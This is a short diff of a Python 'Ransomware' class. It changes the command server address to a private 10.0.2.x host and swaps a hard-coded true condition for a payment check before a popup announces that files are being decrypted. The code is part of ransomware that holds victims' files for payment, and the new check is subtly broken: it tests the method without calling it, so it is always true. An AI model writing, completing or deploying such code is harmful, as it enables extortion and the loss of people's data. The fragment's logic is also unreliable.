@@ -14,7 +14,7 @@ import re
 import tempfile
 
 class Ransomware: 
-    SERVER_IP = "10.0.2.5"
+    SERVER_IP = "10.0.2.15"
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
@@ -324,7 +324,7 @@ class Ransomware:
             if (counter == 60):
                 counter = 1
 
-                if (True):
+                if (self.check_if_user_has_paid):
                     # Waits until all the files has been uploaded before processing the payment
 
                     popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
